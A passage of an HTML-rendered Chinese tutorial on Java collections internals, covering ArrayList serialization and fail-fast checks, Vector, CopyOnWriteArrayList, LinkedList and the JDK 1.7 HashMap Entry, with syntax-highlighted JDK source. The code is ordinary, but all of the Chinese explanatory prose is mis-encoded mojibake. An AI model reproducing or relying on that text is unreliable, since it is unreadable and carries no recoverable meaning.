class=\"n\">size</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span> <span class=\"c1\">// clear to let GC do its work\n</span><span class=\"c1\"></span>    <span class=\"k\">return</span> <span class=\"n\">oldValue</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h3>4. Fail-Fast</h3><p>modCount ç”¨æ¥è®°å½• ArrayList ç»“æ„å‘ç”Ÿå˜åŒ–çš„æ¬¡æ•°ã€‚ç»“æ„å‘ç”Ÿå˜åŒ–æ˜¯æŒ‡æ·»åŠ æˆ–è€…åˆ é™¤è‡³å°‘ä¸€ä¸ªå…ƒç´ çš„æ‰€æœ‰æ“ä½œï¼Œæˆ–è€…æ˜¯è°ƒæ•´å†…éƒ¨æ•°ç»„çš„å¤§å°ï¼Œä»…ä»…åªæ˜¯è®¾ç½®å…ƒç´ çš„å€¼ä¸ç®—ç»“æ„å‘ç”Ÿå˜åŒ–ã€‚</p><p>åœ¨è¿›è¡Œåºåˆ—åŒ–æˆ–è€…è¿­ä»£ç­‰æ“ä½œæ—¶ï¼Œéœ€è¦æ¯”è¾ƒæ“ä½œå‰å modCount æ˜¯å¦æ”¹å˜ï¼Œå¦‚æœæ”¹å˜äº†éœ€è¦æŠ›å‡º ConcurrentModificationExceptionã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">writeObject</span><span class=\"o\">(</span><span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">io</span><span class=\"o\">.</span><span class=\"na\">ObjectOutputStream</span> <span class=\"n\">s</span><span class=\"o\">)</span>\n    <span class=\"kd\">throws</span> <span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">io</span><span class=\"o\">.</span><span class=\"na\">IOException</span><span class=\"o\">{</span>\n    <span class=\"c1\">// Write out element count, and any hidden stuff\n</span><span class=\"c1\"></span>    <span class=\"kt\">int</span> <span class=\"n\">expectedModCount</span> <span class=\"o\">=</span> <span class=\"n\">modCount</span><span class=\"o\">;</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"na\">defaultWriteObject</span><span class=\"o\">();</span>\n\n    <span class=\"c1\">// Write out size as capacity for behavioural compatibility with clone()\n</span><span class=\"c1\"></span>    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"na\">writeInt</span><span class=\"o\">(</span><span class=\"n\">size</span><span class=\"o\">);</span>\n\n    <span class=\"c1\">// Write out all elements in the proper order.\n</span><span class=\"c1\"></span>    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">=</span><span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">&lt;</span><span class=\"n\">size</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n        <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"na\">writeObject</span><span class=\"o\">(</span><span class=\"n\">elementData</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]);</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">modCount</span> <span class=\"o\">!=</span> <span class=\"n\">expectedModCount</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">throw</span> <span class=\"k\">new</span> <span class=\"n\">ConcurrentModificationException</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><h3>5. åºåˆ—åŒ–</h3><p>ArrayList åŸºäºæ•°ç»„å®ç°ï¼Œå¹¶ä¸”å…·æœ‰åŠ¨æ€æ‰©å®¹ç‰¹æ€§ï¼Œå› æ­¤ä¿å­˜å…ƒç´ çš„æ•°ç»„ä¸ä¸€å®šéƒ½ä¼šè¢«ä½¿ç”¨ï¼Œé‚£ä¹ˆå°±æ²¡å¿…è¦å…¨éƒ¨è¿›è¡Œåºåˆ—åŒ–ã€‚</p><p>ä¿å­˜å…ƒç´ çš„æ•°ç»„ elementData ä½¿ç”¨ transient ä¿®é¥°ï¼Œè¯¥å…³é”®å­—å£°æ˜æ•°ç»„é»˜è®¤ä¸ä¼šè¢«åºåˆ—åŒ–ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">transient</span> <span class=\"n\">Object</span><span class=\"o\">[]</span> <span class=\"n\">elementData</span><span class=\"o\">;</span> <span class=\"o\">//</span> <span class=\"n\">non</span><span class=\"o\">-</span><span class=\"kd\">private</span> <span class=\"n\">to</span> <span class=\"n\">simplify</span> <span class=\"n\">nested</span> <span class=\"kd\">class</span> <span class=\"nc\">access</span></code></pre></div><p>ArrayList å®ç°äº† writeObject() å’Œ readObject() æ¥æ§åˆ¶åªåºåˆ—åŒ–æ•°ç»„ä¸­æœ‰å…ƒç´ å¡«å……é‚£éƒ¨åˆ†å†…å®¹ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">readObject</span><span class=\"o\">(</span><span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">io</span><span class=\"o\">.</span><span class=\"na\">ObjectInputStream</span> <span class=\"n\">s</span><span class=\"o\">)</span>\n    <span class=\"kd\">throws</span> <span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">io</span><span class=\"o\">.</span><span class=\"na\">IOException</span><span class=\"o\">,</span> <span class=\"n\">ClassNotFoundException</span> <span class=\"o\">{</span>\n    <span class=\"n\">elementData</span> <span class=\"o\">=</span> <span class=\"n\">EMPTY_ELEMENTDATA</span><span class=\"o\">;</span>\n\n    <span class=\"c1\">// Read in size, and any hidden stuff\n</span><span class=\"c1\"></span>    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"na\">defaultReadObject</span><span class=\"o\">();</span>\n\n    <span class=\"c1\">// Read in capacity\n</span><span class=\"c1\"></span>    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"na\">readInt</span><span class=\"o\">();</span> <span class=\"c1\">// ignored\n</span><span class=\"c1\"></span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">size</span> <span class=\"o\">&gt;</span> <span class=\"n\">0</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"c1\">// be like clone(), allocate array based upon size not capacity\n</span><span class=\"c1\"></span>        <span class=\"n\">ensureCapacityInternal</span><span class=\"o\">(</span><span class=\"n\">size</span><span class=\"o\">);</span>\n\n        <span class=\"n\">Object</span><span class=\"o\">[]</span> <span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"n\">elementData</span><span class=\"o\">;</span>\n        <span class=\"c1\">// Read in all elements in the proper order.\n</span><span class=\"c1\"></span>        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">=</span><span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">&lt;</span><span class=\"n\">size</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n            <span class=\"n\">a</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"na\">readObject</span><span class=\"o\">();</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">writeObject</span><span class=\"o\">(</span><span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">io</span><span class=\"o\">.</span><span class=\"na\">ObjectOutputStream</span> <span class=\"n\">s</span><span class=\"o\">)</span>\n    <span class=\"kd\">throws</span> <span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">io</span><span class=\"o\">.</span><span class=\"na\">IOException</span><span class=\"o\">{</span>\n    <span class=\"c1\">// Write out element count, and any hidden stuff\n</span><span class=\"c1\"></span>    <span class=\"kt\">int</span> <span class=\"n\">expectedModCount</span> <span class=\"o\">=</span> <span class=\"n\">modCount</span><span class=\"o\">;</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"na\">defaultWriteObject</span><span class=\"o\">();</span>\n\n    <span class=\"c1\">// Write out size as capacity for behavioural compatibility with clone()\n</span><span class=\"c1\"></span>    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"na\">writeInt</span><span class=\"o\">(</span><span class=\"n\">size</span><span class=\"o\">);</span>\n\n    <span class=\"c1\">// Write out all elements in the proper order.\n</span><span class=\"c1\"></span>    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">=</span><span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">&lt;</span><span class=\"n\">size</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n        <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"na\">writeObject</span><span class=\"o\">(</span><span class=\"n\">elementData</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]);</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">modCount</span> <span class=\"o\">!=</span> <span class=\"n\">expectedModCount</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">throw</span> <span class=\"k\">new</span> <span class=\"n\">ConcurrentModificationException</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><p>åºåˆ—åŒ–æ—¶éœ€è¦ä½¿ç”¨ ObjectOutputStream çš„ writeObject() å°†å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚æµå¹¶è¾“å‡ºã€‚è€Œ writeObject() æ–¹æ³•åœ¨ä¼ å…¥çš„å¯¹è±¡å­˜åœ¨ writeObject() çš„æ—¶å€™ä¼šå»åå°„è°ƒç”¨è¯¥å¯¹è±¡çš„ writeObject() æ¥å®ç°åºåˆ—åŒ–ã€‚ååºåˆ—åŒ–ä½¿ç”¨çš„æ˜¯ ObjectInputStream çš„ readObject() æ–¹æ³•ï¼ŒåŸç†ç±»ä¼¼ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">ArrayList</span> <span class=\"n\">list</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">();</span>\n<span class=\"n\">ObjectOutputStream</span> <span class=\"n\">oos</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ObjectOutputStream</span><span class=\"o\">(</span><span class=\"k\">new</span> <span class=\"n\">FileOutputStream</span><span class=\"o\">(</span><span class=\"n\">file</span><span class=\"o\">));</span>\n<span class=\"n\">oos</span><span class=\"o\">.</span><span class=\"na\">writeObject</span><span class=\"o\">(</span><span class=\"n\">list</span><span class=\"o\">);</span></code></pre></div><h2>Vector</h2><h3>1. åŒæ­¥</h3><p>å®ƒçš„å®ç°ä¸ ArrayList ç±»ä¼¼ï¼Œä½†æ˜¯ä½¿ç”¨äº† synchronized è¿›è¡ŒåŒæ­¥ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">synchronized</span> <span class=\"kt\">boolean</span> <span class=\"nf\">add</span><span class=\"o\">(</span><span class=\"n\">E</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">modCount</span><span class=\"o\">++;</span>\n    <span class=\"n\">ensureCapacityHelper</span><span class=\"o\">(</span><span class=\"n\">elementCount</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n    <span class=\"n\">elementData</span><span class=\"o\">[</span><span class=\"n\">elementCount</span><span class=\"o\">++]</span> <span class=\"o\">=</span> <span class=\"n\">e</span><span class=\"o\">;</span>\n    <span class=\"k\">return</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">public</span> <span class=\"kd\">synchronized</span> <span class=\"n\">E</span> <span class=\"nf\">get</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">index</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">index</span> <span class=\"o\">&gt;=</span> <span class=\"n\">elementCount</span><span class=\"o\">)</span>\n        <span class=\"k\">throw</span> <span class=\"k\">new</span> <span class=\"n\">ArrayIndexOutOfBoundsException</span><span class=\"o\">(</span><span class=\"n\">index</span><span class=\"o\">);</span>\n\n    <span class=\"k\">return</span> <span class=\"n\">elementData</span><span class=\"o\">(</span><span class=\"n\">index</span><span class=\"o\">);</span>\n<span class=\"o\">}</span></code></pre></div><h3>2. ä¸ ArrayList çš„æ¯”è¾ƒ</h3><ul><li>Vector æ˜¯åŒæ­¥çš„ï¼Œå› æ­¤å¼€é”€å°±æ¯” ArrayList è¦å¤§ï¼Œè®¿é—®é€Ÿåº¦æ›´æ…¢ã€‚æœ€å¥½ä½¿ç”¨ ArrayList è€Œä¸æ˜¯ Vectorï¼Œå› ä¸ºåŒæ­¥æ“ä½œå®Œå…¨å¯ä»¥ç”±ç¨‹åºå‘˜è‡ªå·±æ¥æ§åˆ¶ï¼›</li><li>Vector æ¯æ¬¡æ‰©å®¹è¯·æ±‚å…¶å¤§å°çš„ 2 å€ç©ºé—´ï¼Œè€Œ ArrayList æ˜¯ 1.5 å€ã€‚</li></ul><h3>3. æ›¿ä»£æ–¹æ¡ˆ</h3><p>å¯ä»¥ä½¿ç”¨ <code>Collections.synchronizedList();</code> å¾—åˆ°ä¸€ä¸ªçº¿ç¨‹å®‰å…¨çš„ ArrayListã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">List</span><span class=\"o\">&lt;</span><span class=\"n\">String</span><span class=\"o\">&gt;</span> <span class=\"n\">list</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;();</span>\n<span class=\"n\">List</span><span class=\"o\">&lt;</span><span class=\"n\">String</span><span class=\"o\">&gt;</span> <span class=\"n\">synList</span> <span class=\"o\">=</span> <span class=\"n\">Collections</span><span class=\"o\">.</span><span class=\"na\">synchronizedList</span><span class=\"o\">(</span><span class=\"n\">list</span><span class=\"o\">);</span></code></pre></div><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ concurrent å¹¶å‘åŒ…ä¸‹çš„ CopyOnWriteArrayList ç±»ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">List</span><span class=\"o\">&lt;</span><span class=\"n\">String</span><span class=\"o\">&gt;</span> <span class=\"n\">list</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">CopyOnWriteArrayList</span><span class=\"o\">&lt;&gt;();</span></code></pre></div><h2>CopyOnWriteArrayList</h2><h3>è¯»å†™åˆ†ç¦»</h3><p>å†™æ“ä½œåœ¨ä¸€ä¸ªå¤åˆ¶çš„æ•°ç»„ä¸Šè¿›è¡Œï¼Œè¯»æ“ä½œè¿˜æ˜¯åœ¨åŸå§‹æ•°ç»„ä¸­è¿›è¡Œï¼Œè¯»å†™åˆ†ç¦»ï¼Œäº’ä¸å½±å“ã€‚</p><p>å†™æ“ä½œéœ€è¦åŠ é”ï¼Œé˜²æ­¢å¹¶å‘å†™å…¥æ—¶å¯¼è‡´å†™å…¥æ•°æ®ä¸¢å¤±ã€‚</p><p>å†™æ“ä½œç»“æŸä¹‹åéœ€è¦æŠŠåŸå§‹æ•°ç»„æŒ‡å‘æ–°çš„å¤åˆ¶æ•°ç»„ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">boolean</span> <span class=\"nf\">add</span><span class=\"o\">(</span><span class=\"n\">E</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kd\">final</span> <span class=\"n\">ReentrantLock</span> <span class=\"n\">lock</span> <span class=\"o\">=</span> <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">lock</span><span class=\"o\">;</span>\n    <span class=\"n\">lock</span><span class=\"o\">.</span><span class=\"na\">lock</span><span class=\"o\">();</span>\n    <span class=\"k\">try</span> <span class=\"o\">{</span>\n        <span class=\"n\">Object</span><span class=\"o\">[]</span> <span class=\"n\">elements</span> <span class=\"o\">=</span> <span class=\"n\">getArray</span><span class=\"o\">();</span>\n        <span class=\"kt\">int</span> <span class=\"n\">len</span> <span class=\"o\">=</span> <span class=\"n\">elements</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span>\n        <span class=\"n\">Object</span><span class=\"o\">[]</span> <span class=\"n\">newElements</span> <span class=\"o\">=</span> <span class=\"n\">Arrays</span><span class=\"o\">.</span><span class=\"na\">copyOf</span><span class=\"o\">(</span><span class=\"n\">elements</span><span class=\"o\">,</span> <span class=\"n\">len</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n        <span class=\"n\">newElements</span><span class=\"o\">[</span><span class=\"n\">len</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">e</span><span class=\"o\">;</span>\n        <span class=\"n\">setArray</span><span class=\"o\">(</span><span class=\"n\">newElements</span><span class=\"o\">);</span>\n        <span class=\"k\">return</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span> <span class=\"k\">finally</span> <span class=\"o\">{</span>\n        <span class=\"n\">lock</span><span class=\"o\">.</span><span class=\"na\">unlock</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">final</span> <span class=\"kt\">void</span> <span class=\"nf\">setArray</span><span class=\"o\">(</span><span class=\"n\">Object</span><span class=\"o\">[]</span> <span class=\"n\">a</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">array</span> <span class=\"o\">=</span> <span class=\"n\">a</span><span class=\"o\">;</span>\n<span class=\"o\">}</span>\n<span class=\"nd\">@SuppressWarnings</span><span class=\"o\">(</span><span class=\"s\">&#34;unchecked&#34;</span><span class=\"o\">)</span>\n<span class=\"kd\">private</span> <span class=\"n\">E</span> <span class=\"nf\">get</span><span class=\"o\">(</span><span class=\"n\">Object</span><span class=\"o\">[]</span> <span class=\"n\">a</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">index</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">return</span> <span class=\"o\">(</span><span class=\"n\">E</span><span class=\"o\">)</span> <span class=\"n\">a</span><span class=\"o\">[</span><span class=\"n\">index</span><span class=\"o\">];</span>\n<span class=\"o\">}</span></code></pre></div><h3>é€‚ç”¨åœºæ™¯</h3><p>CopyOnWriteArrayList åœ¨å†™æ“ä½œçš„åŒæ—¶å…è®¸è¯»æ“ä½œï¼Œå¤§å¤§æé«˜äº†è¯»æ“ä½œçš„æ€§èƒ½ï¼Œå› æ­¤å¾ˆé€‚åˆè¯»å¤šå†™å°‘çš„åº”ç”¨åœºæ™¯ã€‚</p><p>ä½†æ˜¯ CopyOnWriteArrayList æœ‰å…¶ç¼ºé™·ï¼š</p><ul><li>å†…å­˜å ç”¨ï¼šåœ¨å†™æ“ä½œæ—¶éœ€è¦å¤åˆ¶ä¸€ä¸ªæ–°çš„æ•°ç»„ï¼Œä½¿å¾—å†…å­˜å ç”¨ä¸ºåŸæ¥çš„ä¸¤å€å·¦å³ï¼›</li><li>æ•°æ®ä¸ä¸€è‡´ï¼šè¯»æ“ä½œä¸èƒ½è¯»å–å®æ—¶æ€§çš„æ•°æ®ï¼Œå› ä¸ºéƒ¨åˆ†å†™æ“ä½œçš„æ•°æ®è¿˜æœªåŒæ­¥åˆ°è¯»æ•°ç»„ä¸­ã€‚</li></ul><p>æ‰€ä»¥ CopyOnWriteArrayList ä¸é€‚åˆå†…å­˜æ•æ„Ÿä»¥åŠå¯¹å®æ—¶æ€§è¦æ±‚å¾ˆé«˜çš„åœºæ™¯ã€‚</p><h2>LinkedList</h2><h3>1. æ¦‚è§ˆ</h3><p>åŸºäºåŒå‘é“¾è¡¨å®ç°ï¼Œä½¿ç”¨ Node å­˜å‚¨é“¾è¡¨èŠ‚ç‚¹ä¿¡æ¯ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">private</span> <span class=\"kd\">static</span> <span class=\"kd\">class</span> <span class=\"nc\">Node</span><span class=\"o\">&lt;</span><span class=\"n\">E</span><span class=\"o\">&gt;</span> <span class=\"o\">{</span>\n    <span class=\"n\">E</span> <span class=\"n\">item</span><span class=\"o\">;</span>\n    <span class=\"n\">Node</span><span class=\"o\">&lt;</span><span class=\"n\">E</span><span class=\"o\">&gt;</span> <span class=\"n\">next</span><span class=\"o\">;</span>\n    <span class=\"n\">Node</span><span class=\"o\">&lt;</span><span class=\"n\">E</span><span class=\"o\">&gt;</span> <span class=\"n\">prev</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><p>æ¯ä¸ªé“¾è¡¨å­˜å‚¨äº† first å’Œ last æŒ‡é’ˆï¼š</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">transient</span> <span class=\"n\">Node</span><span class=\"o\">&lt;</span><span class=\"n\">E</span><span class=\"o\">&gt;</span> <span class=\"n\">first</span><span class=\"o\">;</span>\n<span class=\"kd\">transient</span> <span class=\"n\">Node</span><span class=\"o\">&lt;</span><span class=\"n\">E</span><span class=\"o\">&gt;</span> <span class=\"n\">last</span><span class=\"o\">;</span></code></pre></div><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-066561db014464cab0a6647a4e038cc6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"760\" data-rawheight=\"200\" class=\"origin_image zh-lightbox-thumb\" width=\"760\" data-original=\"https://pic3.zhimg.com/v2-066561db014464cab0a6647a4e038cc6_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;760&#39; height=&#39;200&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"760\" data-rawheight=\"200\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"760\" data-original=\"https://pic3.zhimg.com/v2-066561db014464cab0a6647a4e038cc6_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-066561db014464cab0a6647a4e038cc6_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>2. ä¸ ArrayList çš„æ¯”è¾ƒ</h3><ul><li>ArrayList åŸºäºåŠ¨æ€æ•°ç»„å®ç°ï¼ŒLinkedList åŸºäºåŒå‘é“¾è¡¨å®ç°ï¼›</li><li>ArrayList æ”¯æŒéšæœºè®¿é—®ï¼ŒLinkedList ä¸æ”¯æŒï¼›</li><li>LinkedList åœ¨ä»»æ„ä½ç½®æ·»åŠ åˆ é™¤å…ƒç´ æ›´å¿«ã€‚</li></ul><h2>HashMap</h2><p>ä¸ºäº†ä¾¿äºç†è§£ï¼Œä»¥ä¸‹æºç åˆ†æä»¥ JDK 1.7 ä¸ºä¸»ã€‚</p><h3>1. å­˜å‚¨ç»“æ„</h3><p>å†…éƒ¨åŒ…å«äº†ä¸€ä¸ª Entry ç±»å‹çš„æ•°ç»„ tableã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">transient</span> <span class=\"n\">Entry</span><span class=\"o\">[]</span> <span class=\"n\">table</span><span class=\"o\">;</span></code></pre></div><p>Entry å­˜å‚¨ç€é”®å€¼å¯¹ã€‚å®ƒåŒ…å«äº†å››ä¸ªå­—æ®µï¼Œä» next å­—æ®µæˆ‘ä»¬å¯ä»¥çœ‹å‡º Entry æ˜¯ä¸€ä¸ªé“¾è¡¨ã€‚å³æ•°ç»„ä¸­çš„æ¯ä¸ªä½ç½®è¢«å½“æˆä¸€ä¸ªæ¡¶ï¼Œä¸€ä¸ªæ¡¶å­˜æ”¾ä¸€ä¸ªé“¾è¡¨ã€‚HashMap ä½¿ç”¨æ‹‰é“¾æ³•æ¥è§£å†³å†²çªï¼ŒåŒä¸€ä¸ªé“¾è¡¨ä¸­å­˜æ”¾å“ˆå¸Œå€¼å’Œæ•£åˆ—æ¡¶å–æ¨¡è¿ç®—ç»“æœç›¸åŒçš„ Entryã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-b60c7f12c507f14e1120ec2c9399fb10_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"943\" data-rawheight=\"626\" class=\"origin_image zh-lightbox-thumb\" width=\"943\" data-original=\"https://pic1.zhimg.com/v2-b60c7f12c507f14e1120ec2c9399fb10_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;943&#39; height=&#39;626&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"943\" data-rawheight=\"626\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"943\" data-original=\"https://pic1.zhimg.com/v2-b60c7f12c507f14e1120ec2c9399fb10_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-b60c7f12c507f14e1120ec2c9399fb10_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">static</span> <span class=\"kd\">class</span> <span class=\"nc\">Entry</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"kd\">implements</span> <span class=\"n\">Map</span><span class=\"o\">.</span><span class=\"na\">Entry</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"o\">{</span>\n    <span class=\"kd\">final</span> <span class=\"n\">K</span> <span class=\"n\">key</span><span class=\"o\">;</span>\n    <span class=\"n\">V</span> <span class=\"n\">value</span><span class=\"o\">;</span>\n    <span class=\"n\">Entry</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"n\">next</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">hash</span><span class=\"o\">;</span>\n\n    <span class=\"n\">Entry</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">h</span><span class=\"o\">,</span> <span class=\"n\">K</span> <span class=\"n\">k</span><span class=\"o\">,</span> <span class=\"n\">V</span> <span class=\"n\">v</span><span class=\"o\">,</span> <span class=\"n\">Entry</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"n\">n</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">value</span> <span class=\"o\">=</span> <span class=\"n\">v</span><span class=\"o\">;</span>\n        <span class=\"n\">next</span> <span class=\"o\">=</span> <span class=\"n\">n</span><span class=\"o\">;</span>\n        <span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"n\">k</span><span class=\"o\">;</span>\n        <span class=\"n\">hash</span> <span class=\"o\">=</span> <span class=\"n\">h</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">final</span> <span class=\"n\">K</span> <span class=\"nf\">getKey</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">key</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">final</span> <span class=\"n\">V</span> <span class=\"nf\">getValue</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">value</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">final</span> <span class=\"n\">V</span> <span class=\"nf\">setValue</span><span class=\"o\">(</span><span class=\"n\">V</span> <span class=\"n\">newValue</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">V</span> <span class=\"n\">oldValue</span> <span class=\"o\">=</span> <span class=\"n\">value</span><span class=\"o\">;</span>\n        <span class=\"n\">value</span> <span class=\"o\">=</span> <span class=\"n\">newValue</span><span class=\"o\">;</span>\n        <span class=\"k\">return</span> <span class=\"n\">oldValue</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">final</span> <span class=\"kt\">boolean</span> <span class=\"nf\">equals</span><span class=\"o\">(</span><span class=\"n\">Object</span> <span class=\"n\">o</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">if</span> <span class=\"o\">(!(</span><span class=\"n\">o</span> <span class=\"k\">instanceof</span> <span class=\"n\">Map</span><span class=\"o\">.</span><span class=\"na\">Entry</span><span class=\"o\">))</span>\n            <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n        <span class=\"n\">Map</span><span class=\"o\">.</span><span class=\"na\">Entry</span> <span class=\"n\">e</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"n\">Map</span><span class=\"o\">.</span><span class=\"na\">Entry</span><span class=\"o\">)</span><span class=\"n\">o</span><span class=\"o\">;</span>\n        <span class=\"n\">Object</span> <span 